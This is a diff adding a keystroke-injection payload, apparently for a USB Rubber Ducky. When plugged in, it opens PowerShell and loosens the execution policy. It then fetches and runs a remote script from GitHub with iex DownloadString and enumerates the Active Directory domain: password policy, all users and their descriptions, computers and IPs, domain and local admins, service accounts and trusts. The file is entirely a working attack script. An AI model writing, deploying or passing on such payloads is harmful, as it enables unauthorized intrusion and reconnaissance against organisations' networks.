@@ -1,0 +1,70 @@
+LOCALE FR
+DELAY 2000
+GUI r
+DELAY 3000
+DELETE
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 1000
+STRING Set-ExecutionPolicy RemoteSigned
+DELAY 500
+ENTER
+DELAY 500
+STRING iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+DELAY 500
+ENTER
+DELAY 10000
+STRING Get-ADDefaultDomainPasswordPolicy
+DELAY 500
+ENTER
+DELAY 500
+STRING Get-ADDomainController -Discover
+DELAY 500
+ENTER
+DELAY 500
+STRING Get-ADUser -Filter * -Properties * | Select SamAccountName,PasswordLastSet,PasswordNeverExpires,MemberOf,Description
+DELAY 500
+ENTER
+DELAY 3000
+STRING Get-ADComputer -Filter * | Select Name,LastLogonDate,IPv4Address
+DELAY 500
+ENTER
+DELAY 3000
+STRING Get-ADGroup -Filter * | Select Name
+DELAY 500
+ENTER
+DELAY 3000
+STRING Get-ADGroupMember -Identity Administrateurs
+DELAY 500
+ENTER
+DELAY 1000
+STRING Get-ADGroupMember -Identity Administrators
+DELAY 500
+ENTER
+DELAY 1000
+STRING Get-ADGroupMember -Identity "Admins du domaine"
+DELAY 500
+ENTER
+DELAY 1000
+STRING Get-ADGroupMember -Identity "Domain Admins"
+DELAY 500
+ENTER
+DELAY 1000
+STRING Get-ADForest
+DELAY 500
+ENTER
+DELAY 1000
+STRING Get-ADServiceAccount -Filter *
+DELAY 500
+ENTER
+DELAY 1000
+STRING Get-ADTrust -Filter *
+DELAY 500
+ENTER
+DELAY 1000
+STRING exit
+DELAY 500
+ENTER
+
+
